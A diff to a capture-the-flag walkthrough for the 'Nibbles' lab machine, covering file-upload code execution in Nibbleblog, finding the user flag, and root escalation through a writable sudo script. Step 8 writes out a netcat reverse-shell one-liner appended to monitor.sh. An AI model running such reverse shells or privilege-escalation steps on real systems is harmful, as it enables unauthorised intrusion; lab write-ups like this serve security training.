@@ -34,3 +34,18 @@ All like RHOST or LHOST i hope you have to know, what kind of value the need, bu
 But i have no idea why this exploit don't wanna run, i do some recon and i found how to do RCE by file upload. You need to go plugins/my_image and there you can use your reverse-shell.php, but remember before upload this image, change the ip, on your local. After ur upload go to nibbleblog/content/private/plugins/my_image/ and there you can find your reverse-shell
 
 ![obraz](https://github.com/Anogota/Nibbles/assets/143951834/c4a4b6ea-3d75-4294-b844-ad34646fd11d)
+
+6.Submit the flag located in the nibbler user's home directory.
+You need to go into this directory and there you can find user.txt /home/nibbler
+
+7.What is the name of the script that nibbler can run as root on Nibbles?
+By command: sudo -l you can know, what kind of script nibbler can run as root, here is the results:
+Now we know, this script name is monitor.sh
+
+8.Submit the flag located in root's home directory.
+It is easy to get you need to only write this command in your terminal: echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.17 1337 >/tmp/f' | tee -a monitor.sh
+Than you have access by root. Than write this sudo /home/nibbler/personal/stuff/monitor.sh and you got this, the root.
+
+![obraz](https://github.com/Anogota/Nibbles/assets/143951834/0fd73d4a-7b80-4aff-80c7-286c931650c3)
+
+![obraz](https://github.com/Anogota/Nibbles/assets/143951834/febbccc3-9e94-47af-9bae-80a290a71b01)
